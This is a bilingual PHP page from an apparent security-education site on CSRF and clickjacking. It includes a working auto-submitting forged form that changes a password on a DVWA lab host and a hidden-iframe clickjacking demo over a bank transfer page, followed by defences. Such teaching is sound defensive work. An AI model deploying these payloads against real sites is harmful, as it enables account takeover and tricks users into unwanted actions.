<?php
require_once __DIR__ . '/../bootstrap.php';
$pageTitle    = $lang==='es' ? 'CSRF y Clickjacking — CyberEscudo' : 'CSRF & Clickjacking — CyberEscudo';
$contentTitle = $lang==='es' ? 'CSRF y Clickjacking' : 'CSRF & Clickjacking';
$contentDate  = '2022-04-12';
$contentTags  = ['CSRF','Clickjacking','OWASP','Tokens','X-Frame-Options'];
ob_start(); if ($lang==='es'): ?>
<div class="prose">
  <p>Estudio práctico de las vulnerabilidades <strong>CSRF</strong> (Cross-Site Request Forgery) y <strong>Clickjacking</strong>, su explotación en DVWA y sus contramedidas.</p>

  <h2>1. CSRF — Cross-Site Request Forgery</h2>
  <p>El atacante engaña a un usuario autenticado para que ejecute acciones no deseadas en una aplicación web donde tiene sesión activa.</p>

  <h3>Condiciones necesarias</h3>
  <ul>
    <li>La víctima tiene sesión activa en la aplicación objetivo.</li>
    <li>La aplicación no valida el origen de las peticiones.</li>
    <li>Las acciones se realizan mediante peticiones predecibles (sin tokens aleatorios).</li>
  </ul>

  <h3>Explotación en DVWA (nivel low)</h3>
  <pre><code>&lt;!-- Página maliciosa que el atacante envía a la víctima --&gt;
&lt;!-- Si la víctima la abre mientras tiene sesión en DVWA, cambia su contraseña --&gt;
&lt;html&gt;
&lt;body onload="document.forms[0].submit()"&gt;
  &lt;form action="http://10.0.2.4/dvwa/vulnerabilities/csrf/"
        method="GET"&gt;
    &lt;input type="hidden" name="password_new" value="hackeado"&gt;
    &lt;input type="hidden" name="password_conf" value="hackeado"&gt;
    &lt;input type="hidden" name="Change" value="Change"&gt;
  &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>

  <h3>Contramedidas CSRF</h3>
  <pre><code>&lt;?php
// 1. CSRF Token — generar y validar en cada formulario:
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// En el formulario HTML:
// &lt;input type="hidden" name="csrf_token" value="&lt;?= $_SESSION['csrf_token'] ?&gt;"&gt;

// Al procesar el formulario:
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die('CSRF token inválido');
}
?&gt;</code></pre>
  <pre><code># 2. SameSite Cookie (en php.ini o código):
session.cookie_samesite = Strict
# o
session.cookie_samesite = Lax

# 3. Verificar cabecera Origin/Referer:
if ($_SERVER['HTTP_ORIGIN'] !== 'https://midominio.com') {
    http_response_code(403); exit;
}</code></pre>

  <h2>2. Clickjacking</h2>
  <p>El atacante superpone un iframe invisible sobre una página legítima para que el usuario haga clic en elementos sin saberlo.</p>

  <h3>Demostración básica</h3>
  <pre><code>&lt;!-- El atacante crea una página con un iframe invisible sobre la víctima --&gt;
&lt;style&gt;
  iframe {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0.0001;   /* invisible pero interactivo */
    z-index: 999;
  }
  .boton-falso {
    position: absolute;
    top: 200px; left: 300px;
    z-index: 1;
  }
&lt;/style&gt;

&lt;!-- Botón falso que el usuario cree que está pulsando --&gt;
&lt;div class="boton-falso"&gt;¡Gana un iPhone!&lt;/div&gt;

&lt;!-- Iframe de la página real (ej: botón de transferencia bancaria) --&gt;
&lt;iframe src="https://banco.com/transferir"&gt;&lt;/iframe&gt;</code></pre>

  <h3>Contramedidas Clickjacking</h3>
  <pre><code># 1. Cabecera HTTP X-Frame-Options (en .htaccess o código):
Header set X-Frame-Options "DENY"
# o
Header set X-Frame-Options "SAMEORIGIN"

# 2. Content Security Policy frame-ancestors:
Header set Content-Security-Policy "frame-ancestors 'none';"
# o permitir solo el propio dominio:
Header set Content-Security-Policy "frame-ancestors 'self';"

# 3. Frame-busting JavaScript (menos fiable):
if (top !== self) { top.location = self.location; }</code></pre>

  <h2>Resumen comparativo</h2>
  <table>
    <thead><tr><th>Ataque</th><th>Mecanismo</th><th>Contramedida principal</th></tr></thead>
    <tbody>
      <tr><td>CSRF</td><td>Petición HTTP forjada ejecutada por sesión activa</td><td>CSRF Token + SameSite Cookie</td></tr>
      <tr><td>Clickjacking</td><td>Iframe invisible superpuesto sobre página legítima</td><td>X-Frame-Options: DENY</td></tr>
    </tbody>
  </table>
</div>
<?php else: ?>
<div class="prose">
  <p>Practical study of <strong>CSRF</strong> (Cross-Site Request Forgery) and <strong>Clickjacking</strong> vulnerabilities, including exploitation on DVWA and countermeasures.</p>

  <h2>1. CSRF — Cross-Site Request Forgery</h2>
  <p>The attacker tricks an authenticated user into executing unwanted actions on a web application where they have an active session.</p>

  <h3>Required conditions</h3>
  <ul>
    <li>The victim has an active session on the target application.</li>
    <li>The application does not validate the origin of requests.</li>
    <li>Actions are performed via predictable requests (no random tokens).</li>
  </ul>

  <h3>Exploitation on DVWA (low security level)</h3>
  <pre><code>&lt;!-- Malicious page sent to the victim --&gt;
&lt;!-- If opened while logged into DVWA, it changes their password --&gt;
&lt;html&gt;
&lt;body onload="document.forms[0].submit()"&gt;
  &lt;form action="http://10.0.2.4/dvwa/vulnerabilities/csrf/"
        method="GET"&gt;
    &lt;input type="hidden" name="password_new"  value="hacked"&gt;
    &lt;input type="hidden" name="password_conf" value="hacked"&gt;
    &lt;input type="hidden" name="Change"        value="Change"&gt;
  &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>

  <h3>CSRF Countermeasures</h3>
  <pre><code>&lt;?php
// 1. CSRF Token — generate and validate on every form submission:
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
// In HTML form:
// &lt;input type="hidden" name="csrf_token" value="&lt;?= $_SESSION['csrf_token'] ?&gt;"&gt;

// On form submission:
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die('Invalid CSRF token');
}
?&gt;

# 2. SameSite Cookie attribute (php.ini):
session.cookie_samesite = Strict

# 3. Verify Origin/Referer header:
if ($_SERVER['HTTP_ORIGIN'] !== 'https://mydomain.com') {
    http_response_code(403); exit;
}</code></pre>

  <h2>2. Clickjacking</h2>
  <p>The attacker overlays an invisible iframe on top of a legitimate page so the user unknowingly clicks on elements of that page.</p>

  <h3>Basic demonstration</h3>
  <pre><code>&lt;style&gt;
  iframe {
    position: absolute; top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0.0001;   /* invisible but interactive */
    z-index: 999;
  }
  .fake-button { position: absolute; top: 200px; left: 300px; z-index: 1; }
&lt;/style&gt;

&lt;div class="fake-button"&gt;Win a prize!&lt;/div&gt;
&lt;iframe src="https://bank.com/transfer"&gt;&lt;/iframe&gt;</code></pre>

  <h3>Clickjacking Countermeasures</h3>
  <pre><code"># 1. X-Frame-Options HTTP header:
Header set X-Frame-Options "DENY"
# or
Header set X-Frame-Options "SAMEORIGIN"

# 2. CSP frame-ancestors directive (modern, preferred):
Header set Content-Security-Policy "frame-ancestors 'none';"
# or allow own domain only:
Header set Content-Security-Policy "frame-ancestors 'self';"</code></pre>

  <h2>Summary Comparison</h2>
  <table>
    <thead><tr><th>Attack</th><th>Mechanism</th><th>Main Defense</th></tr></thead>
    <tbody>
      <tr><td>CSRF</td><td>Forged HTTP request executed via active session</td><td>CSRF Token + SameSite Cookie</td></tr>
      <tr><td>Clickjacking</td><td>Invisible iframe overlaid on legitimate page</td><td>X-Frame-Options: DENY</td></tr>
    </tbody>
  </table>
</div>
<?php endif; $contentBody=ob_get_clean(); require __DIR__.'/../templates/content-page.php';
